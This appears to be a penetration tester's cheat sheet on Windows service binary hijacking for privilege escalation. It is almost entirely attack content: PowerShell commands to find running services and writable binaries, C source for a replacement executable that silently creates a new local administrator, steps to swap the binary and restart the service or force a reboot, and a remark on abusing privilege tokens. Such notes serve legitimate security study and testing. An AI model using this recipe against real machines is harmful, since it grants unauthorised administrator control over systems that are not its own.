# SERVICE BINARY HIJACKING
#query_services
```powershell
services.msc
Get-Service
Get-CimInstance

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#enum_permissions
```powershell
icacls
Get-ACL

icacls mask / perms
F - Full 
M - Modify 
RX - Read + Execute
R - Read Only
W - Write Only

icacls [some file]
```

#malicious_binary
```powershell
#compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
#IF NON ADMIN USER MAY NOT HAVE PRIVS FOR THIS TRY REVSHELL

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user [username] [password] /add");
  i = system ("net localgroup administrators [username] /add");
  
  return 0;
}
```

#exploit 
```powershell
#replace binary with malicious binary
#restart service or reboot computer if autopmatic start

net stop / net start 
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#need SeShutDownPrivilege
whoami /priv
#The tokens that appear as Disabled can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens

shutdown /r /t 0
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens